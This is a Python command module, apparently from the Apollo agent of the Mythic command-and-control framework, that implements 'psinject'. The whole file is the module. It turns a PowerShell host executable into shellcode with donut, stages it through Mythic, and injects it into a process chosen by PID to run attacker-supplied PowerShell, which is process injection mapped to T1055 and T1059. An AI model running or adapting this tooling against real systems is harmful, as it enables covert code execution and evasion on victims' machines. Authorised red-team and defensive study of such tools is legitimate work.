from mythic_payloadtype_container.MythicCommandBase import *
import json
from sRDI import ShellcodeRDI
from uuid import uuid4
from mythic_payloadtype_container.MythicRPC import *
from os import path
import base64
import donut

class PsInjectArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number, description="Process ID to inject into."),
            "powershell_params": CommandParameter(name="PowerShell Command", type=ParameterType.String, description="PowerShell command to execute."),
        }

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.strip().split(" ", maxsplit=1)
            if len(parts) != 2:
                raise Exception("Invalid command line arguments passed.\n\tUsage: {}".format(PsInjectCommand.help_cmd))
            try:
                int(parts[0])
            except:
                raise Exception(f"Invalid PID passed to psinject: {parts[0]}")
            self.add_arg("pid", int(parts[0]), ParameterType.Number)
            self.add_arg("powershell_params", parts[1])
        self.add_arg("pipe_name", str(uuid4()))
        pass


class PsInjectCommand(CommandBase):
    cmd = "psinject"
    needs_admin = False
    help_cmd = "psinject [pid] [command]"
    description = "Executes PowerShell in the process specified by `[pid]`. Note: Currently stdout is not captured of child processes if not explicitly captured into a variable or via inline execution (such as `$(whoami)`)."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PsInjectArguments
    attackmapping = ["T1059", "T1055"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        exePath = path.join(self.agent_code_path, "PowerShellHost/bin/Release/PowerShellHost.exe")
        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(donutPic).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
        task.display_params = "{} {}".format(task.args.get_arg("pid"), task.args.get_arg("powershell_params"))
        return task

    async def process_response(self, response: AgentResponse):
        pass
